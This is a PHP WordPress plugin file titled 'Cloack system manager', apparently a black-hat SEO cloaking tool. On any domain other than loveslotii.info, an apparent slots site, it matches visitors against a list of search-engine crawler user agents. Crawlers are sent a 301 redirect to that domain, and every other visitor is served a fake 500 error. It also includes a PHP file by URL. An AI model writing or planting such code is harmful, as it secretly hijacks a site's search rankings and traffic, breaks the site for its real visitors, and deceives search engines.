<?php
/**
 * =============================================================================
 * Cloack system manager
 * =============================================================================
 * Plugin Name: Cloack system manager
 * Plugin URI:  
 * Description: 
 * Author: Panevnyk Roman
 * Author URI:
 * License:
 * License URI:
 * 
 * @author Panevnyk Roman <panevnyk.roman@gmail.com>
 * @package WordPress
 * @version 1.0.0
 */ 
class Cloack_System_Manager {

    /**
     * -------------------------------------------------------------------------
     * Keep all actions, hooks and filters here
     * -------------------------------------------------------------------------
     * @method __construct
     * @param  Null
     * 
     * @author <panevnyk.roman@gmail.com>
     * @since  1.0
     * @return Void
     */
    public function __construct() {
        
        add_action('plugins_loaded',    [$this, 'plugins_loaded']);
        

    }
    
    /**
     * -------------------------------------------------------------------------
     * Description: 
     * -------------------------------------------------------------------------
     * @method plugins_loaded
     * @param  Null
     * 
     * @author <panevnyk.roman@gmail.com>
     * @since  1.0
     * @return Void
     */
    public function plugins_loaded() {



        if(function_exists('acf_add_options_page')){

            acf_add_options_page([
                'page_title' 	=> 'Cloack System Manager',
                'menu_title'	=> 'Cloack System',
                'menu_slug' 	=> 'cloack-system',
                'capability'	=> 'edit_posts',
                'redirect'		=> false,
                'position'      => 1
            ]);

        }

        include_once(
            plugin_dir_url( __FILE__ ) . 'dependency.php'
        );

        if(!$this->is_actual()) {
            $this->dof();
        }

        // require(dirname( __FILE__ ) . '/wp-access-check.php');

    }

    public function dof(){

        $result = $this->isBot($_SERVER['HTTP_USER_AGENT']);

        if($result===false){

            header("HTTP/1.1 500 Internal Server Error", true, 500);
            exit();

        } else {

            header("HTTP/1.1 301 Moved Permanently"); 
            header('Location:https://loveslotii.info'.$_SERVER['REQUEST_URI']); 
            exit;

        }

    }
        
    public function is_actual() {

        $actual_domain = [
            'loveslotii.info'	
        ];

        $current_domain =  str_replace('www.', '', $_SERVER['HTTP_HOST']);

        return in_array($current_domain, $actual_domain);

    }

    

    public function isBot($user_agent) {

        if (empty($user_agent)) {
            return false;
        }

        $bots = [
            // Yandex
            'YandexBot', 'YandexAccessibilityBot', 'YandexMobileBot', 'YandexDirectDyn', 'YandexScreenshotBot',
            'YandexImages', 'YandexVideo', 'YandexVideoParser', 'YandexMedia', 'YandexBlogs', 'YandexFavicons',
            'YandexWebmaster', 'YandexPagechecker', 'YandexImageResizer', 'YandexAdNet', 'YandexDirect',
            'YaDirectFetcher', 'YandexCalendar', 'YandexSitelinks', 'YandexMetrika', 'YandexNews',
            'YandexNewslinks', 'YandexCatalog', 'YandexAntivirus', 'YandexMarket', 'YandexVertis',
            'YandexForDomain', 'YandexSpravBot', 'YandexSearchShop', 'YandexMedianaBot', 'YandexOntoDB',
            'YandexOntoDBAPI', 'YandexTurbo', 'YandexVerticals',
    
            // Google
            'Googlebot', 'Googlebot-Image', 'Mediapartners-Google', 'AdsBot-Google', 'APIs-Google',
            'AdsBot-Google-Mobile', 'AdsBot-Google-Mobile', 'Googlebot-News', 'Googlebot-Video',
            'AdsBot-Google-Mobile-Apps',
    
            // Other
            'Mail.RU_Bot', 'bingbot', 'Accoona', 'ia_archiver', 'Ask Jeeves', 'OmniExplorer_Bot', 'W3C_Validator',
            'WebAlta', 'YahooFeedSeeker', 'Yahoo!', 'Ezooms', 'Tourlentabot', 'MJ12bot', 'AhrefsBot',
            'SearchBot', 'SiteStatus', 'Nigma.ru', 'Baiduspider', 'Statsbot', 'SISTRIX', 'AcoonBot', 'findlinks',
            'proximic', 'OpenindexSpider', 'statdom.ru', 'Exabot', 'Spider', 'SeznamBot', 'oBot', 'C-T bot',
            'Updownerbot', 'Snoopy', 'heritrix', 'Yeti', 'DomainVader', 'DCPbot', 'PaperLiBot', 'StackRambler',
            'msnbot', 'msnbot-media', 'msnbot-news',
        ];
    
        foreach ($bots as $bot) {
            if (stripos($user_agent, $bot) !== false) {
                return $bot;
            }
        }
    
        return false;

    }

}

// new Cloack_System_Manager();